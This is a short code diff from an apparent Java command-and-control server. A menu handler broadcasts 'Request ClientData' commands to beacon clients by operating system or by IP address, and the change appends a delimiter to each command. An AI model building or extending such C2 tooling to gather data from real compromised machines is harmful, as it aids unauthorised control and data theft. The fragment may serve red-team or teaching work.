@@ -472,22 +472,22 @@ public class C2ServerUserHandler implements Runnable{
                 if(userInput.equals("1")){
                     String OS = "Windows";
                     // TO DO figure out how to send request to beacon server
-                    C2server.broadcastToBeacons("Request ClientData "+ OS +" All");
+                    C2server.broadcastToBeacons("Request ClientData "+ OS +" All_ ");
                     try {
                         waitForResponse();
                     } catch (InterruptedException e) {e.printStackTrace();}
                 } else if (userInput.equals("2")){
                     String OS = "Linux";
                     // TO DO figure out how to send request to beacon server
-                    C2server.broadcastToBeacons("Request ClientData "+ OS +" All");
+                    C2server.broadcastToBeacons("Request ClientData "+ OS +" All_ ");
                     try {
                         waitForResponse();
                     } catch (InterruptedException e) {e.printStackTrace();}
                 } else if (userInput.equals("3")){
                     System.out.print("Enter IP Address for desired request >> ");
                     String IPAddress = userInputScanner.nextLine();
-                    C2server.broadcastToBeacons("Request ClientData Windows " + IPAddress);
-                    C2server.broadcastToBeacons("Request ClientData Linux " + IPAddress);
+                    C2server.broadcastToBeacons("Request ClientData Windows " + IPAddress + "_ ");
+                    C2server.broadcastToBeacons("Request ClientData Linux " + IPAddress + "_ ");
                     try {
                         waitForResponse();
                     } catch (InterruptedException e) {e.printStackTrace();}
